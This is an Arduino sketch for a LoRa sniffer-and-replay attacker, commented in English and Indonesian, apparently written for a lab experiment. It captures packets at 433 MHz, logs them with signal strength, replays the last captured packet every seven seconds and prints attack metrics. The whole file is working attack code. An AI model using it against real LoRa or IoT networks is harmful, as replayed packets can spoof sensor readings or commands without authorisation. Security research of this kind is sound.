/*
ATTACKER / SNIFFER LoRa
--------------------------------
Author: Mohammad Rizki  Fadillah
Description:
This code implements a LoRa sniffer that listens for LoRa packets on a specified frequency and prints the received data along with signal strength (RSSI) and signal-to-noise ratio (SNR). It uses the LoRa library to interface with the LoRa module and the SPI library for communication. The sniffer is configured to use specific pins for SS, RST, and DIO0, and it sets the spreading factor, signal bandwidth, and coding rate to match the sender's configuration. The code continuously checks for incoming packets and prints their contents when detected.
This code is for educational purposes only. Unauthorized use may be illegal and unethical. Always obtain proper permissions before conducting any security testing.
--------------------------------
*/
/*
ATTACKER / SNIFFER + REPLAY LoRa
--------------------------------
Author: Mohammad Rizki  Fadillah
Description:
Alat ini menyadap (Sniff) paket di udara, lalu menembakkannya kembali 
(Replay Attack) setiap 7 detik. Jika tidak ada paket baru yang 
disadap selama 30 detik, proses replay berhenti dan summary dicetak.
--------------------------------
*/

#include <SPI.h>
#include <LoRa.h>

#define SS   5
#define RST  14
#define DIO0 26

// ===== PARAM =====
const uint32_t EXPECTED = 200;
const unsigned long REPLAY_INTERVAL = 7000; // Replay tiap 7 detik
const unsigned long TIMEOUT_MS = 30000;     // Terminating 30 detik

// ===== METRICS =====
uint32_t sniffedCount = 0;
uint32_t decodedCount = 0;
uint32_t invalidCount = 0;
uint32_t replayedCount = 0; // Ngitung total tembakan replay

// ===== OPTIONAL UNIQUE TRACK =====
bool seen[EXPECTED] = {false};
uint32_t uniqueCount = 0;
uint32_t duplicateCount = 0;

// ===== STATE LOGIC =====
unsigned long lastRecvTime = 0;
unsigned long lastReplayTime = 0;
bool started = false;
bool done = false; 
String lastPacket = "";

// ===== VALIDATION =====
bool isValidPayload(String data, uint32_t &id) {
  int p1 = data.indexOf(',');
  int p2 = data.indexOf(',', p1 + 1);

  if (p1 == -1 || p2 == -1) return false;

  String idStr = data.substring(0, p1);

  // cek ID numeric
  for (int i = 0; i < idStr.length(); i++) {
    if (!isDigit(idStr[i])) return false;
  }

  id = idStr.toInt();
  return true;
}

void printSummary() {
  float sniffRate = (sniffedCount * 100.0) / EXPECTED;
  float decodeRate = (sniffedCount > 0) ? ((decodedCount * 100.0) / sniffedCount) : 0;
  float packetLoss = 100.0 - sniffRate;

  Serial.println("\n=== ATTACKER SUMMARY ===");

  Serial.print("Sniffed Total: "); Serial.println(sniffedCount);
  Serial.print("Decoded Valid: "); Serial.println(decodedCount);
  Serial.print("Invalid (Gagal dibaca): "); Serial.println(invalidCount);

  Serial.print("Unique: "); Serial.println(uniqueCount);
  Serial.print("Duplicate: "); Serial.println(duplicateCount);
  
  Serial.print("TOTAL SPAM REPLAY: "); Serial.println(replayedCount);

  Serial.print("Sniff Success / PDR (%): "); Serial.println(sniffRate);
  Serial.print("Missed / Packet Loss (%): "); Serial.println(packetLoss);
  Serial.print("Decode Success (%): "); Serial.println(decodeRate);
}

void setup() {
  Serial.begin(115200);

  SPI.begin(18, 19, 23, SS);
  LoRa.setPins(SS, RST, DIO0);

  if (!LoRa.begin(433000000)) {
    Serial.println("LoRa init FAILED!");
    while (1);
  }

  LoRa.setSpreadingFactor(7);
  LoRa.setSignalBandwidth(125E3);
  LoRa.setCodingRate4(5);

  LoRa.receive();

  Serial.println("Attacker (Sniff + Replay) Ready...");
  Serial.println("Replay tiap 7s | Terminate kalo 30s kosong\n");
}

void loop() {
  if (done) return; 

  // =========================
  // 1. SNIFF LOGIC
  // =========================
  int packetSize = LoRa.parsePacket();

  if (packetSize) {
    lastRecvTime = millis();
    started = true;
    sniffedCount++;

    String data = "";
    while (LoRa.available()) {
      data += (char)LoRa.read();
    }

    uint32_t id = 0;
    bool valid = isValidPayload(data, id);

    if (valid) {
      decodedCount++;
      if (id < EXPECTED) {
        if (!seen[id]) {
          seen[id] = true;
          uniqueCount++;
        } else {
          duplicateCount++;
        }
      }
    } else {
      invalidCount++;
    }

    // LOG SNIFF
    Serial.print("[SNIFF] ");
    Serial.print(data);
    Serial.print(" | RSSI=");
    Serial.print(LoRa.packetRssi());
    Serial.print(" | SNR=");
    Serial.print(LoRa.packetSnr());
    if (!valid) Serial.print(" | INVALID");
    Serial.println();

    // Simpan buat direplay
    lastPacket = data;

    // Kalo aja dapet 200 pas tanpa loss
    if (sniffedCount >= EXPECTED) {
      printSummary();
      done = true;
    }
  }

  // =========================
  // 2. REPLAY ATTACK LOGIC (Tiap 7 Detik)
  // =========================
  if (started && !done && lastPacket != "") {
    if (millis() - lastReplayTime >= REPLAY_INTERVAL) {
      // Pastiin belum masuk zona timeout
      if (millis() - lastRecvTime <= TIMEOUT_MS) {
        lastReplayTime = millis();
        replayedCount++;

        Serial.print("[REPLAY] Nembak ulang: ");
        Serial.println(lastPacket);

        LoRa.beginPacket();
        LoRa.print(lastPacket);
        LoRa.endPacket();

        // Wajib balik ke receive biar ga budek
        LoRa.receive(); 
      }
    }
  }

  // =========================
  // 3. TIMEOUT / TERMINATING LOGIC (30 Detik)
  // =========================
  if (started && !done && (millis() - lastRecvTime > TIMEOUT_MS)) {
    Serial.println("\n[TIMEOUT] 30 Detik ga ada mangsa baru. Sesi Replay STOP!");
    printSummary();
    done = true;
  }
}